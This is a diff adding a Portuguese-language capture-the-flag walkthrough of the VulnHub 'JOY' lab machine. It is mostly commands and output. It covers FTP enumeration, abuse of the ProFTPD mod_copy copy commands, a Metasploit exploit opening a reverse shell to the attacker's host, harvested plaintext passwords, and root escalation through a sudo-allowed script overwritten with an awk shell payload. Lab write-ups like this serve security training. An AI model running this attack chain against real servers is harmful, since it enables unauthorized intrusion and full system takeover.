@@ -1,0 +1,275 @@
+# netdiscover:
+192.168.1.106
+
+
+# nmap:
+PORT    STATE SERVICE     VERSION
+21/tcp  open  ftp         ProFTPD 1.2.10
+22/tcp  open  ssh         Dropbear sshd 0.34 (protocol 2.0)
+25/tcp  open  smtp        Postfix smtpd
+80/tcp  open  http        Apache httpd 2.4.25
+110/tcp open  pop3        Dovecot pop3d
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+143/tcp open  imap        Dovecot imapd
+445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+465/tcp open  smtp        Postfix smtpd
+587/tcp open  smtp        Postfix smtpd
+993/tcp open  ssl/imaps?
+995/tcp open  ssl/pop3s?
+
+
+# netcat:
+Permite logon anonimo com usuário:
+anonymous/anonymous
+ftp/ftp
+
+
+# ftp:
+root@Pentest:/home/joaofracassi/beco-xpl/joy# ftp 192.168.1.106
+Connected to 192.168.1.106.
+220 The Good Tech Inc. FTP Server
+Name (192.168.1.106:joaofracassi): anonymous
+331 Anonymous login ok, send your complete email address as your password
+Password:
+230 Anonymous access granted, restrictions apply
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+200 PORT command successful
+150 Opening ASCII mode data connection for file list
+drwxrwxr-x   2 ftp      ftp          4096 Jan  6  2019 download
+drwxrwxr-x   2 ftp      ftp          4096 Jan 10  2019 upload
+226 Transfer complete
+ftp> exit
+221 Goodbye.
+
+
+# Teste usuário anonymous com metasploit:
+auxiliary/scanner/ftp/anonymous
+
+# Permissão de leitura e escrita com o anonymous:
+msf5 > use auxiliary/scanner/ftp/anonymous 
+msf5 auxiliary(scanner/ftp/anonymous) > options
+
+Module options (auxiliary/scanner/ftp/anonymous):
+
+   Name     Current Setting      Required  Description
+   ----     ---------------      --------  -----------
+   FTPPASS  mozilla@example.com  no        The password for the specified username
+   FTPUSER  anonymous            no        The username to authenticate as
+   RHOSTS                        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT    21                   yes       The target port (TCP)
+   THREADS  1                    yes       The number of concurrent threads (max one per host)
+
+msf5 auxiliary(scanner/ftp/anonymous) > set rhosts 192.168.1.106
+rhosts => 192.168.1.106
+msf5 auxiliary(scanner/ftp/anonymous) > run
+
+[+] 192.168.1.106:21      - 192.168.1.106:21 - Anonymous READ/WRITE (220 The Good Tech Inc. FTP Server)
+[*] 192.168.1.106:21      - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf5 auxiliary(scanner/ftp/anonymous) > 
+
+
+# ftp conecta via browser:
+ftp://192.168.1.106/
+
+
+# conectado ao servidor ftp em modo anonymous, e copiado o arquivo control_version de /home/patrick para /home/ftp:
+root@Pentest:/home/joaofracassi/beco-xpl/joy# script conectando-ftp
+Script started, output log file is 'conectando-ftp'.
+root@Pentest:/home/joaofracassi/beco-xpl/joy# nc 192.168.1.106 21
+220 The Good Tech Inc. FTP Server
+site cpfr /home/patrick/version_control
+350 File or directory exists, ready for destination name
+site cpto /home/ftp/versl 
+250 Copy successful
+
+
+# localizado o arquivo com seu conteúdo:
+ftp://192.168.1.106/versl
+
+Version Control of External-Facing Services:
+
+Apache: 2.4.25
+Dropbear SSH: 0.34
+ProFTPd: 1.3.5
+Samba: 4.5.12
+
+We should switch to OpenSSH and upgrade ProFTPd.
+
+Note that we have some other configurations in this machine.
+1. The webroot is no longer /var/www/html. We have changed it to /var/www/tryingharderisjoy.
+2. I am trying to perform some simple bash scripting tutorials. Let me see how it turns out.
+
+OBS:. O diretório padrão foi alterado de /var/www para /var/www/tryingharderisjoy.
+
+
+# exploit:
+# agora vamos explorar a vulnerabilidade, explorado com sucesso.
+
+exploit/unix/ftp/proftpd_modcopy_exec
+cmd/unix/reverse_python
+
+
+Module options (exploit/unix/ftp/proftpd_modcopy_exec):
+
+   Name       Current Setting             Required  Description
+   ----       ---------------             --------  -----------
+   Proxies                                no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS     192.168.1.106               yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT      80                          yes       HTTP port (TCP)
+   RPORT_FTP  21                          yes       FTP port
+   SITEPATH   /var/www/tryingharderisjoy  yes       Absolute writable website path
+   SSL        false                       no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /                           yes       Base path to the website
+   TMPPATH    /tmp                        yes       Absolute writable path
+   VHOST                                  no        HTTP server virtual host
+
+
+Payload options (cmd/unix/reverse_python):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.1.105    yes       The listen address (an interface may be specified)
+   LPORT  443              yes       The listen port
+   SHELL  /bin/bash        yes       The system shell to use.
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   ProFTPD 1.3.5
+
+
+msf5 exploit(unix/ftp/proftpd_modcopy_exec) > exploit
+
+[*] Started reverse TCP handler on 192.168.1.105:443 
+[*] 192.168.1.106:80 - 192.168.1.106:21 - Connected to FTP server
+[*] 192.168.1.106:80 - 192.168.1.106:21 - Sending copy commands to FTP server
+[*] 192.168.1.106:80 - Executing PHP payload /HDNoah.php
+[*] Command shell session 1 opened (192.168.1.105:443 -> 192.168.1.106:50994) at 2020-09-26 01:21:54 -0300
+
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data),123(ossec)
+whoami
+www-data
+
+
+Necessário a escalação de privilégios.
+
+
+# Localizado credenciais:
+
+cd ossec
+cat patricksecretsofjoy                                
+
+credentials for JOY:
+patrick:apollo098765
+root:howtheheckdoiknowwhattherootpasswordis
+
+# shell interativo:
+python -c 'import pty;pty.spawn("/bin/bash")'
+
+
+# logado no sistema como Patrick:
+www-data@JOY:/var/www/tryingharderisjoy/ossec$ su patrick
+su patrick
+Password: apollo098765
+
+patrick@JOY:/var/www/tryingharderisjoy/ossec$ 
+
+
+# vericando as permissões do Patrick:
+patrick@JOY:/var/www/tryingharderisjoy/ossec$ sudo -l
+sudo -l
+Matching Defaults entries for patrick on JOY:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User patrick may run the following commands on JOY:
+    (ALL) NOPASSWD: /home/patrick/script/test (!!!tem permissão de executar esse arquivo test, sem senha, criaremos um arquivo malicioso com o mesmo nome e enviaremos via ftp para esse caminho).
+patrick@JOY:/var/www/tryingharderisjoy/ossec$ 
+
+
+
+# arquivo malicioso:
+root@Pentest:/home/joaofracassi/beco-xpl/joy# echo "awk 'BEGIN {system(\"/bin/bash\")}'" > test
+root@Pentest:/home/joaofracassi/beco-xpl/joy# cat test 
+awk 'BEGIN {system("/bin/bash")}'
+
+
+# enviar o arquivo para o servidor:
+root@Pentest:/home/joaofracassi/beco-xpl/joy# ftp 192.168.1.106
+Connected to 192.168.1.106.
+220 The Good Tech Inc. FTP Server
+Name (192.168.1.106:joaofracassi): anonymous
+331 Anonymous login ok, send your complete email address as your password
+Password:
+230 Anonymous access granted, restrictions apply
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> put test
+local: test remote: test
+200 PORT command successful
+150 Opening BINARY mode data connection for test
+226 Transfer complete
+34 bytes sent in 0.00 secs (948.6607 kB/s)
+ftp> ls
+200 PORT command successful
+150 Opening ASCII mode data connection for file list
+drwxrwxr-x   2 ftp      ftp          4096 Jan  6  2019 download
+-rw-r--r--   1 ftp      ftp            34 Sep 26 04:40 test
+drwxrwxr-x   2 ftp      ftp          4096 Jan 10  2019 upload
+-rw-r--r--   1 0        0             407 Sep 26 04:14 versl
+226 Transfer complete
+ftp> 
+
+
+# agora vamos explorar a falha novamente:
+# enviado o arquivo via ftp para /home/patrick/script/test
+root@Pentest:/home/joaofracassi/beco-xpl/joy# nc 192.168.1.106 21
+220 The Good Tech Inc. FTP Server
+site cpfr /home/ftp/test
+350 File or directory exists, ready for destination name
+site cpto /home/patrick/script/test
+250 Copy successful
+
+# agora devemos executar o arquivo para fazer a escalação de privilégios.
+patrick@JOY:~$ sudo /home/patrick/script/test
+sudo /home/patrick/script/test
+root@JOY:/home/patrick# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+root@JOY:/home/patrick# cd /root
+cd /root
+
+
+
+Links:
+https://www.vulnhub.com/entry/digitalworldlocal-joy,298/
+https://www.youtube.com/watch?v=jYvfvljepgs
+http://www.proftpd.org/docs/contrib/mod_copy.html
+https://www.bleepingcomputer.com/news/security/proftpd-vulnerability-lets-users-copy-files-without-permission/
+https://www.exploit-db.com/exploits/36803
+https://www.howtogeek.com/562941/how-to-use-the-awk-command-on-linux/
+https://www.howtogeek.com/562941/how-to-use-the-awk-command-on-linux/
+https://guialinux.uniriotec.br/awk/
+http://www.dltec.com.br/blog/linux/uma-introducao-ao-uso-do-awk-no-linux/
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
